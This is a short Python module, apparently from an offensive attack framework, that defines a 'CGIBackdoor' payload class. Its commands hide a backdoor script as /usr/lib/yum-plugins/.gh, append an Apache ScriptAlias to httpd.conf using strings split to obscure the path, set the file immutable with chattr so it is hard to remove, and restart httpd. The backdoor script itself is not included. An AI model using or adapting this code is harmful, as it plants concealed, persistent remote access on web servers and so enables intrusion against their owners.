#!/usr/bin/python3

from ..base import Payload

class CGIBackdoor(Payload):

    files = {'cgibd.py': '/usr/lib/yum-plugins/.gh'}

    def __init__(self):
        self.commands = []

        self.commands.append("""printf '\\nScriptAlias /cgi/ "/usr/lib/yum"""
                             """-plugins/"\\n\\n<Directory "/usr/lib/yum-p"""
                             """lugins/">\\n    AllowOverride None\\n    O"""
                             """ptions None\\n    Order allow,deny\\n    A"""
                             """llow from all\\n</Directory>' >> /etc/http"""
                             """d/conf/httpd.conf""")
        self.commands.append("chattr -i /usr/lib/yum-plugins/.gh")
        self.commands.append("chmod 555 /usr/lib/yum-plugins/.gh")
        self.commands.append("chattr +i /usr/lib/yum-plugins/.gh")
        self.commands.append("/etc/init.d/httpd restart")

    def steps(self):
        return self.commands


